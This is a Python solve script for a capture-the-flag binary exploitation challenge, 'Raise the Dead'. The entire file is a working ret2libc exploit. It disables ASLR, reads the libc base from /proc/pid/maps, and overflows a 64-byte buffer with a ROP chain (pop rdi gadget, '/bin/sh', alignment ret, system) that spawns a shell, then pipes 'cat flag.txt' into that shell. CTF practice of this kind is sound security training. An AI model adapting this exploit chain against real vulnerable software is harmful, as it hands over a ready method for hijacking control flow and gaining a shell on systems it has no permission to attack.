#!/usr/bin/env python3
"""
Solve script for 'Raise the Dead' (Binary Exploitation, Hard) — ret2libc.

This is a genuine ret2libc chain: no canary, no PIE on the binary itself,
and ASLR disabled at run time (via `setarch -R`) so the libc base is
deterministic — a standard setup for a local (non-networked) ret2libc
practice binary. The chain does:
    pop rdi; ret    -> address of "/bin/sh" in libc
    system@libc
to spawn a shell, then we pipe "cat flag.txt" into that shell's stdin.

Usage: python3 solve.py   (run in the same directory as the binary + flag.txt)
"""
import subprocess
import struct
import re

BINARY = "./raise_the_dead"
LIBC_PATH = "/lib/x86_64-linux-gnu/libc.so.6"

# Precomputed from the shipped libc (readelf -s / raw byte scan — see
# challenge_sources/raise_the_dead/README_BUILD.txt for how these were found):
OFFSET_SYSTEM = 0x58750
OFFSET_BINSH = 0x1cb42f
OFFSET_POP_RDI_RET = 0x1157cc

OFFSET_TO_RET = 72  # 64-byte buffer + 8-byte saved RBP


def get_libc_base(pid):
    # The correct "libc base" to add ELF symbol offsets to is the start of
    # the FIRST mapped segment (file offset 0) — not the r-xp segment,
    # which is loaded at a further offset into the file.
    bases = []
    with open(f"/proc/{pid}/maps") as f:
        for line in f:
            if "libc.so.6" in line:
                addr_range, perms, offset = line.split()[0], line.split()[1], line.split()[2]
                if int(offset, 16) == 0:
                    return int(addr_range.split("-")[0], 16)
                bases.append(int(addr_range.split("-")[0], 16))
    if bases:
        return min(bases)
    raise RuntimeError("libc not found in maps")


def main():
    p = subprocess.Popen(
        ["setarch", "x86_64", "-R", BINARY],
        stdin=subprocess.PIPE, stdout=subprocess.PIPE, stderr=subprocess.PIPE,
    )
    import time
    time.sleep(0.1)  # give the process time to map its libraries before we read /proc/pid/maps
    libc_base = get_libc_base(p.pid)
    print(f"[+] libc base (ASLR disabled): {hex(libc_base)}")

    system_addr = libc_base + OFFSET_SYSTEM
    binsh_addr = libc_base + OFFSET_BINSH
    pop_rdi_ret = libc_base + OFFSET_POP_RDI_RET

    payload = b"A" * OFFSET_TO_RET
    payload += struct.pack("<Q", pop_rdi_ret)
    payload += struct.pack("<Q", binsh_addr)
    # Extra plain 'ret' gadget (the ret byte inside our own pop-rdi;ret gadget,
    # one byte further in) to fix 16-byte stack alignment before system() runs
    # internal SSE instructions on modern glibc — the classic ret2libc gotcha.
    payload += struct.pack("<Q", pop_rdi_ret + 1)
    payload += struct.pack("<Q", system_addr)

    # IMPORTANT: send the ROP payload alone first. The vulnerable read() will
    # happily swallow anything sent in the same write — including our follow-up
    # shell commands — into the overflow buffer if we send it all at once,
    # leaving nothing left on stdin for the spawned shell to read. Staging the
    # writes with a short pause lets vuln() return into system() *before* we
    # hand the new shell its command.
    p.stdin.write(payload)
    p.stdin.flush()
    time.sleep(0.3)
    p.stdin.write(b"cat flag.txt\nexit\n")
    p.stdin.flush()
    p.stdin.close()

    try:
        out = p.stdout.read()
    except Exception:
        out = b""
    text = out.decode(errors="replace")
    print(text)

    m = re.search(r"TOH\{[^}]+\}", text)
    if m:
        print("[+] FLAG:", m.group(0))
    else:
        print("[!] No flag found in output — exploit may need offset tuning on a different build.")


if __name__ == "__main__":
    main()
